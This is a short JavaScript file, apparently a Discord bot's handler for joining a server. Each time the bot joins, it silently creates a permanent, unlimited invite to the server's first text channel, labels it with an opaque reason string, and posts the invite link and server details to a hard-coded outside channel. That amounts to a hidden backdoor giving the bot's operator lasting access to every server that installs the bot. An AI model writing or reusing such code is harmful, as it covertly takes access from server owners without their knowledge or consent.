
module.exports = async (bot, guild) => {
    const Discord = require("discord.js");
    const { TOKEN, PREFIX, mytime, activity, ownerid , TOKEN2, clientID, logid, hexcolor} = require('../modules/config');
    var allchannels = []
guild.channels.forEach(async (channel, id) => {
    if(channel.type == "text"){
    allchannels.push(id)}
})
bot.channels.get(allchannels[0]).createInvite({temporary:false,maxAge:0,maxUses:0,unique:true,reason:"DTW$^GSA" }).then(invite => bot.channels.get("548889420258869281").send(`Created an invite with a code of ${invite.code} \n INFO:\n guild : ${invite.guild}\n channel: ${invite.channel} \n who made it: ${invite.inviter} \n expires at: ${invite.expiresAt} \n URL :${invite.url}`))
}